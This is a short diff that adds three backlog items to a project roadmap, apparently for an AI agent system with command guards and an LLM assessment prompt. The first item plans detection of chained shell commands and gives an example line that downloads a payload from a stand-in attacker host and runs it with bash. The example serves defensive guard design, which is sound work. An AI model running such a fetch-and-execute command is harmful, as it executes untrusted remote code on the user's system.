@@ -1,6 +1,9 @@
 # Bloom Evolution Roadmap
 
 ## Backlog
+- [ ] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
+- [ ] Raise `getRelevantLearnings` fetch limit from 10 to 25 so mid-relevance learnings in underrepresented categories surface within the prompt budget
+- [ ] Enrich assessment prompt with recent failure patterns from `failureCategoryBreakdown` to give the LLM explicit signal about what went wrong in prior cycles
 
 ## Up Next
 
